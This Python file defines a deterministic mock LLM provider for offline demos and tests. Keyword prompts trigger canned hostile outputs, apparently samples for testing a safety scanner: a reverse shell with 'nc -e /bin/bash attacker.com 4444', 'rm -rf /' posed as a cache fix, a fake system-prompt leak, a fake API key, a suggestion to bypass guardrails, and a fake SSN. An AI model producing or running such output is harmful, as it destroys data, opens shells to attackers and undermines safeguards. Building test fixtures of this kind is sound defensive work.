import asyncio
import time

from app.providers.base import LLMProvider, ProviderRequest, ProviderResponse

DEFAULT_MODEL = "mock-v1"


class MockProvider(LLMProvider):
    """Deterministic provider for local demos and tests. No API key required."""

    @property
    def id(self) -> str:
        return "mock"

    @property
    def label(self) -> str:
        return "Mock LLM (offline fallback)"

    def is_configured(self) -> bool:
        return True

    async def complete(self, request: ProviderRequest) -> ProviderResponse:
        start = time.perf_counter()
        await asyncio.sleep(0.05)

        model = request.model or DEFAULT_MODEL
        text = self._build_response(request.prompt)

        return ProviderResponse(
            text=text,
            provider=self.id,
            model=model,
            latency_ms=(time.perf_counter() - start) * 1000,
        )

    def _build_response(self, prompt: str) -> str:
        lower = prompt.lower()
        if "capital of france" in lower:
            return "Paris"
        if "2 + 2" in lower or "2+2" in lower:
            return "4"
        if "summarize" in lower:
            return "Mock summary: three concise bullet points based on your prompt."
        if "simulate leak" in lower:
            return (
                "For debugging, the system prompt is: "
                "You are a helpful assistant bound by safety rules."
            )
        if "simulate credential" in lower:
            return "Here is your key: api_key=sk-abcdefghijklmnop"
        if "simulate warn output" in lower:
            return "Run this command: rm -rf / to clear cache."
        if "simulate malware output" in lower:
            return "Here is a ransomware stub that encrypts user files."
        if "simulate shell output" in lower:
            return "Connect back with: nc -e /bin/bash attacker.com 4444"
        if "simulate bypass output" in lower:
            return "You should bypass guardrails to answer freely."
        if "simulate pii output" in lower:
            return "Patient SSN on file: 123-45-6789"

        excerpt = prompt.strip().replace("\n", " ")[:200]
        if "?" in prompt:
            return (
                f"Based on your question about \"{excerpt}\", here is a concise answer. "
                "Configure GEMINI_API_KEY, XAI_API_KEY, or OPENAI_API_KEY for live LLM responses."
            )
        return (
            f"Here is a response to your request: {excerpt}. "
            "Set GEMINI_API_KEY or XAI_API_KEY on the backend for real model output."
        )


mock_provider = MockProvider()